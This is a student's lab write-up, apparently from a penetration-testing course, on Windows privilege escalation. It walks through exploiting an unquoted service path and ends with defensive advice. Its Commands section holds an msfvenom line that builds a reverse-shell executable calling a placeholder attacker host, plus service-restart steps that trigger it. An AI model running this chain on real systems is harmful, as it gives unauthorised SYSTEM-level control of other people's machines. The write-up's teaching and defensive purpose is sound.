# 🔴 Module 16 — Windows Privilege Escalation

## 📚 What I Learned

Windows privilege escalation follows the same underlying principle as Module 15's Linux vectors — a documented, normal system behavior becomes dangerous purely because of how a service or setting was configured, not because of a flaw in Windows itself.

**Key vectors:**
- **Unquoted service paths** — Windows resolves an unquoted path with spaces by trying each space-separated segment in order as a potential executable. If a service runs as SYSTEM and a low-privileged user can write a file to one of those earlier segments, their file executes first, with SYSTEM privileges.
- **Weak service permissions** — if a low-privileged user can modify a SYSTEM-running service (its executable path, or restart it), they can point it at malicious code.
- **AlwaysInstallElevated** — a misconfigured registry setting that lets any user install .msi packages with SYSTEM privileges, checked via two registry keys (HKLM and HKCU) both needing to return 0x1.
- **Stored/cached credentials** — credentials sometimes sit in unattended installation files, PowerShell history, saved RDP credentials, or the registry.
- **Token impersonation** — abusing privileges like SeImpersonatePrivilege via "Potato" family exploits to escalate from a service account to SYSTEM.
- **Kernel exploits** — outdated Windows versions/patches with known local privilege escalation CVEs, researched the same way as Module 08's remote CVE lookups.

**WinPEAS** automates scanning for all of the above vectors, mirroring LinPEAS's role on the Linux side from Module 15.

## 🧠 Key Concepts

- **The vulnerability in an unquoted service path is the missing quotation marks, not Windows' path-resolution behavior.** Windows trying each space-separated segment is documented, expected behavior — the mistake is entirely on whoever configured the service without wrapping the path in quotes.
- **Two conditions must both be true for unquoted-path exploitation to work: the path must be unquoted, AND the target directory/file must be writable by a low-privileged user.** Missing either condition closes the vector.
- **This mirrors Module 15's core lesson exactly** — SUID on vim wasn't a Linux bug, and an unquoted service path isn't a Windows bug. Both are cases where a normal, documented feature becomes dangerous purely due to a human configuration choice.

## 🧪 Practical Lab

### Objective
Identify and exploit an unquoted service path vulnerability to escalate from a low-privileged shell to SYSTEM.

### Scenario
A low-privileged shell on a Windows machine, gained through a prior web app exploit or payload delivery.

### Tools
wmic, icacls, msfvenom, net (service control)

### Commands
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """
icacls "C:\Program Files\Backup Sync"
msfvenom -p windows/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe -o Backup.exe
net stop BackupSyncService
net start BackupSyncService

## 🔎 Findings

- `wmic` enumeration identified a service ("Backup Sync Service") running with an unquoted path pointing to `C:\Program Files\Backup Sync\backupsync.exe`, configured for automatic startup
- `icacls` confirmed the containing folder granted Modify permissions to the standard Users group — meaning a low-privileged account could write files into that location
- A malicious executable was placed as `C:\Program Files\Backup.exe`, matching the second space-separated segment Windows would attempt first
- Restarting the service (running as SYSTEM) triggered execution of the malicious file before Windows ever reached the legitimate service executable
- Confirmed via `getuid` in the resulting session: `NT AUTHORITY\SYSTEM`

## 💡 What I Discovered

This module reinforced Module 15's lesson from a completely different OS — the actual "vulnerability" in both cases was a human configuration mistake, not a flaw in the underlying system. The two-part condition here (unquoted path AND writable directory) was a useful reminder that real privilege escalation findings often require chaining two separate, individually minor issues together rather than relying on one dramatic flaw.

## 🛡️ Defensive Perspective

- All service paths containing spaces should be explicitly wrapped in quotes — a simple configuration fix that fully closes this vector regardless of folder permissions.
- Folder and file permissions for any location referenced by a SYSTEM-running service should be audited to ensure only administrators can write there.
- AlwaysInstallElevated should be disabled by default and only enabled with clear justification, given how directly it grants SYSTEM-level installation rights to any user.
- Regularly auditing service configurations (via tools like WinPEAS or manual wmic queries) catches these misconfigurations before an attacker finds them first.

## 📝 Lessons Learned

Windows and Linux privilege escalation share the same underlying philosophy despite completely different mechanisms — documented system behavior becomes an attack path only when combined with a configuration mistake. Real findings often depend on two separate conditions being true simultaneously (unquoted path + writable location), which is a useful pattern to watch for across other vulnerability classes too.

## 🏁 Conclusion

Module 16 covered the core Windows privilege escalation vectors and demonstrated a full unquoted service path exploitation, from enumeration through a confirmed SYSTEM-level shell. Combined with Module 15, this closes out the OS-level privilege escalation portion of the roadmap's Post-Exploitation phase, setting up directly for Module 17: Credential Discovery.
